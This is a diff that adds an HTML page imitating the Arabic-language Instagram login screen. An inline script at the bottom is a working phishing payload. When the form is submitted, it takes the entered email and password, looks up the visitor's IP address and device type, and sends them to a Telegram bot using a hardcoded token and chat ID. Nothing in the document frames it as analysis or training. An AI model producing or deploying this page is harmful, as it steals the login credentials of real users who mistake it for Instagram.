@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>نسخة إنستغرام</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="شعار إنستغرام" title="شعار إنستغرام" />
+                </h1>
+
+
+<form id="login-form">
+    <label for="email" class="sr-only">رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني</label>
+    <input id="email" name="email" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" />
+
+    <label for="password" class="sr-only">كلمة المرور</label>
+    <input id="password" name="password" type="password" placeholder="كلمة المرور" />
+
+    <button type="submit">تسجيل الدخول</button>
+</form>
+
+
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">أو</div>
+                    <span></span>
+                </div>
+
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>تسجيل الدخول باستخدام فيسبوك</a>
+                    </div>
+
+                    <a href="#">هل نسيت كلمة المرور؟</a>
+                </div>
+            </div>
+
+            <div class="panel register flex justify-content-center">
+                <p>ليس لديك حساب؟</p>
+                <a href="#">إنشاء حساب</a>
+            </div>
+
+            <div class="app-download flex direction-column align-items-center">
+                <p>احصل على التطبيق.</p>
+
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png" alt="تنزيل من متجر آبل" title="تنزيل من متجر آبل" />
+                    <img src="./img/googleplay-button.png" alt="تنزيل من متجر جوجل بلاي" title="تنزيل من متجر جوجل بلاي" />
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">حول</a></li>
+            <li><a href="#">المساعدة</a></li>
+            <li><a href="#">الصحافة</a></li>
+            <li><a href="#">واجهة API</a></li>
+            <li><a href="#">الوظائف</a></li>
+            <li><a href="#">الخصوصية</a></li>
+            <li><a href="#">الشروط</a></li>
+            <li><a href="#">الموقع</a></li>
+            <li><a href="#">أبرز الحسابات</a></li>
+            <li><a href="#">الوسوم</a></li>
+            <li><a href="#">اللغة</a></li>
+        </ul>
+
+        <p class="copyright">© 2020 Instagram من Facebook</p>
+    </footer>
+	<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "8885720806:AAH4eVrHQ48uHInIJjnv5AB5pxrEAJrIXP4"; 
+    const CHAT_ID = "5133376032"; 
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // الحصول على معلومات الجهاز
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+                const userAgent = navigator.userAgent;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = `
+<b>New Login Attempt</b>
+<b>Email:</b> ${email}
+<b>Password:</b> ${password}
+<b>IP:</b> ${ip}
+<b>Device:</b> ${deviceType}
+                `;
+
+                // إرسال البيانات
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('تم الإرسال بنجاح!');
+                }).catch(error => {
+                    console.error(error);
+                    alert('حدث خطأ في الإرسال');
+                });
+            })
+            .catch(error => {
+                alert('خطأ في الاتصال');
+            });
+    });
+</script>
+
+	
+
+</body>
+</html>
